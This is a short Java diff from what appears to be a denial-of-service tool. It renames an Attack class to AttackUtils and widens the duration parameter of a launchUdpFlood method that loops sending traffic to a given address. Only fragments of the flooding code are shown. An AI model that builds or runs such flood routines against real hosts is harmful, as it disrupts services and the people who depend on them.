@@ -8,12 +8,12 @@ import java.net.DatagramSocket;
 import java.net.InetSocketAddress;
 import java.net.Socket;
 
-public final class Attack {
+public final class AttackUtils {
 	
 	private static final int TCP_INTERVAL = 1;
 	private static final int UDP_INTERVAL = 150;
 	
-	private Attack() {
+	private AttackUtils() {
 		//...
 	}
 	
@@ -75,7 +75,7 @@ public final class Attack {
 		}
 	}
 	
-	public static void launchUdpFlood(final String address, final int milliseconds) {
+	public static void launchUdpFlood(final String address, final long milliseconds) {
 		final long time = System.currentTimeMillis();
 		
 		while (System.currentTimeMillis() - time < milliseconds) {
